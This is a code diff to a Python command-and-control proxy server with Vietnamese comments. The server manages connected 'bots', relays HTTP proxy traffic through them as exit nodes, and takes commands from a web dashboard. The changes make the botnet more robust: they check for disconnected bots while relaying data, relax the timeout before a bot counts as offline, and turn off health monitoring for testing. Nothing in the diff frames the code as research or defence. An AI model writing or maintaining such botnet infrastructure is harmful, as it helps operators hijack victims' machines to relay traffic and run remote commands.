@@ -75,8 +75,8 @@ class C2ProxyServer:
         # Khởi động client server để nhận commands từ web dashboard
         self.start_client_server()
         
-        # Khởi động health monitoring
-        self.start_health_monitoring()
+        # Khởi động health monitoring (tạm thời tắt để test)
+        # self.start_health_monitoring()
         print(f"✅ C2 Proxy Server started successfully!")
         print(f"   🖥️  C2 Server: {self.c2_host}:{self.c2_port}")
         print(f"   🌐 HTTP Proxy: {self.c2_host}:{self.proxy_port}")
@@ -890,16 +890,30 @@ class C2ProxyServer:
             conn = self.active_proxy_connections[connection_id]
             client_sock = conn['client_socket']
             bot_id = conn['bot_id']
+            
+            # Check if bot is still connected
+            if bot_id not in self.connected_bots:
+                print(f"⚠️  Bot {bot_id} disconnected during pump")
+                return
+                
             bot_sock = self.connected_bots[bot_id]['socket']
+            
             while True:
                 data = client_sock.recv(4096)
                 if not data:
                     # notify bot end
                     try:
-                        bot_sock.sendall(f"END:{connection_id}\n".encode())
+                        if bot_id in self.connected_bots:
+                            bot_sock.sendall(f"END:{connection_id}\n".encode())
                     except Exception:
                         pass
                     break
+                    
+                # Check if bot is still connected before sending
+                if bot_id not in self.connected_bots:
+                    print(f"⚠️  Bot {bot_id} disconnected during data send")
+                    break
+                    
                 self._send_data_frame_to_bot(bot_sock, connection_id, data)
         except Exception as e:
             print(f"❌ pump client->bot error {connection_id}: {e}")
@@ -1150,10 +1164,15 @@ class BotHealthMonitor:
                 last_seen = bot_info['last_seen']
                 time_diff = (current_time - last_seen).total_seconds()
                 
-                if time_diff > 60:  # No response for 1 minute
+                if time_diff > 300:  # No response for 5 minutes (more lenient)
                     bot_info['status'] = 'offline'
                     if bot_id in bot_exit_nodes:
                         bot_exit_nodes[bot_id]['status'] = 'offline'
+                else:
+                    # Bot is considered online if connected within 5 minutes
+                    bot_info['status'] = 'online'
+                    if bot_id in bot_exit_nodes:
+                        bot_exit_nodes[bot_id]['status'] = 'active'
                         
                 # Send ping to bot
                 bot_socket = bot_info['socket']
